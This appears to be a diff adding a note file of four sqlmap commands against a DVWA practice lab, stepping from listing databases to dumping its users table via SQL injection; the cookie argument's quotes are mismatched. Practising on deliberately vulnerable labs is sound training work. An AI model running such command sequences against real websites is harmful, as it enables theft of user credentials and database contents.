@@ -1,0 +1,7 @@
+sqlmap --url http://webspoit2018/dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie="security=low; PHPSESSID=hjdhjd666667hhh11' -dbs
+
+sqlmap --url http://webspoit2018/dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie="security=low; PHPSESSID=hjdhjd666667hhh11' --tables -D dvwa
+
+sqlmap --url http://webspoit2018/dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie="security=low; PHPSESSID=hjdhjd666667hhh11' --columns -D dvwa -T users
+
+sqlmap --url http://webspoit2018/dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie="security=low; PHPSESSID=hjdhjd666667hhh11' --dump -D dvwa -T users
